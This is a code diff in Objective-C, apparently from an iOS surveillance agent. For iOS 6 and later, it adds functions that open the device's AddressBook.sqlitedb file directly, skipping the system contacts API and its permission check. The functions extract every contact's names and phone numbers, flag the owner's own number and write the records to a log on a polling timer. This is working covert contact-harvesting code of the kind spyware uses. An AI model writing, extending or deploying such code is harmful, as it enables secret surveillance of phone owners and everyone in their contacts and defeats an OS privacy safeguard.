@@ -537,9 +537,160 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
   return YES;
 }
 
+- (NSMutableArray*)getContactNumbers:(NSInteger)theId
+{
+  long          label;
+  char          sql_query_curr[1024];
+  int           ret, nrow = 0, ncol = 0;
+  char          *szErr;
+  char          **result;
+  sqlite3       *db;
+  char          sql_query_all[] = "select label, value from ABMultiValue ";
+  BOOL          bNumFound = FALSE;
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSString      *number ;
+  NSMutableArray *numArray = [[NSMutableArray alloc] initWithCapacity:0];
+
+  
+  sprintf(sql_query_curr, "%s where record_id = %d", sql_query_all, theId);
+  
+  if (sqlite3_open("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", &db))
+  {
+    sqlite3_close(db);
+    [pool release];
+    return numArray;
+  }
+  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
+
+  sqlite3_close(db);
+  
+  if (ret != SQLITE_OK)
+  {
+    [pool release];
+    return numArray;
+  }
+  
+  if (ncol * nrow > 0)
+  {
+    for (int i = 0; i< nrow * ncol; i += 2)
+    {
+      sscanf(result[ncol + i], "%ld", (long*)&label);
+      
+      // 1 = mobile, 2 = iPhone, 3 = home
+      if (label == 1)
+      {
+        number = [NSString stringWithUTF8String: result[ncol + i + 1]];
+        bNumFound = TRUE;
+        break;
+      }
+    }
+    
+    // get first phone number if any...
+    if (bNumFound == FALSE)
+      number = [NSString stringWithUTF8String: result[ncol + 1]];
+    
+    NSDictionary *dict = [NSDictionary dictionaryWithObject: number forKey: @"Number"];
+    
+    [numArray addObject: dict];
+    
+    sqlite3_free_table(result);
+  }
+  
+  [pool release];
+  
+  return numArray;
+}
+
+- (void)getABContacts
+{
+  long          rowid;
+  char          sql_query_curr[1024];
+  int           ret, nrow = 0, ncol = 0;
+  char          *szErr;
+  char          **result;
+  sqlite3       *db;
+  char          sql_query_all[] = "select rowid,first,last from ABPerson";
+  static        CFStringRef  nullName = CFSTR("");
+  
+  sprintf(sql_query_curr, "%s where rowid > %f", sql_query_all, mLastABDateTime);
+  
+  if (sqlite3_open("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", &db))
+  {
+    sqlite3_close(db);
+    return;
+  }
+  // running the query
+  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
+  
+  // Close as soon as possible
+  sqlite3_close(db);
+  
+  if (ret != SQLITE_OK)
+    return;
+  
+  NSMutableArray *abRecords = [[NSMutableArray alloc] initWithCapacity:0];
+  
+  // Only if we got some msg...
+  if (ncol * nrow > 0)
+  {
+    for (int i = 0; i< nrow * ncol; i += 3)
+    {
+      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+      
+      sscanf(result[ncol + i], "%ld", (long*)&rowid);
+      
+      NSString *firstName = [NSString stringWithUTF8String: result[ncol + i + 1]];
+      NSString *lastName  = [NSString stringWithUTF8String: result[ncol + i + 2]];
+      NSMutableArray *numbers = [self getContactNumbers: rowid];
+      
+      NSString *isMyNumber = @"NO";
+      
+      if ([self isMyPhoneNumber: numbers] == TRUE)
+      {
+        mIsMyContactSaved = TRUE;
+        isMyNumber = @"YES";
+      }
+      
+      NSArray *objects =
+        [NSArray arrayWithObjects: (firstName != NULL ? (id)firstName : (id)nullName),
+                                   (lastName  != NULL ? (id)lastName  : (id)nullName),
+                                   numbers,
+                                   isMyNumber,
+                                   nil];
+      
+      NSArray *keys = [NSArray arrayWithObjects: @"First",
+                                                 @"Last",
+                                                 @"Numbers",
+                                                 @"IsMyNumber",
+                                                 nil];
+      
+      NSDictionary *rec = [[NSDictionary alloc] initWithObjects: objects forKeys: keys];
+      
+      [abRecords addObject: rec];
+      
+      [numbers release];
+      [rec release];
+      
+      [inner release];
+    }
+    
+    sqlite3_free_table(result);
+  }
+  
+  if ([abRecords count])
+    [self _writeABLog: abRecords];
+  
+  [abRecords release];
+}
+
 - (void)getABWithDateTime:(NSTimer*)theTimer
-{  
-  [self _getABWithDateTime: mLastABDateTime];
+{
+  if (gOSMajor >= 6)
+    [self getABContacts];
+  else
+    [self _getABWithDateTime: mLastABDateTime];
 }
 
 @end
@@ -586,7 +737,9 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
 - (void)startAgent
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-
+  
+  ABAddressBookRef addressBook = NULL;
+  
   if ([self isThreadCancelled] == TRUE)
     {
       [self setMAgentStatus: AGENT_STATUS_STOPPED];  
@@ -601,19 +754,27 @@ static void  ABNotificationCallback(ABAddressBookRef addressBook,
     mMyPhoneNumber = [[[_i_Utils sharedInstance] getPhoneNumber] retain];
   }
   
-  ABAddressBookRef addressBook = [self _getAddressBookRef];
-  
-  if (addressBook == NULL) 
-    {
-      [self setMAgentStatus: AGENT_STATUS_STOPPED];
-      [mMyPhoneNumber release];
-      [outerPool release];
-      return;
-    }
- 
-  if(mLastABDateTime == ALL_ADDRESS)
-    [self _getABWithDateTime: ALL_ADDRESS];
+  if (gOSMajor >= 6)
+  {
+    if(mLastABDateTime == ALL_ADDRESS)
+      [self getABContacts];
+  }
+  else
+  {
+    addressBook = [self _getAddressBookRef];
     
+    if (addressBook == NULL) 
+      {
+        [self setMAgentStatus: AGENT_STATUS_STOPPED];
+        [mMyPhoneNumber release];
+        [outerPool release];
+        return;
+      }
+   
+    if(mLastABDateTime == ALL_ADDRESS)
+      [self _getABWithDateTime: ALL_ADDRESS];
+  }
+  
   [self setABPollingTimeOut: CHANGE_TIME];
   
   while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
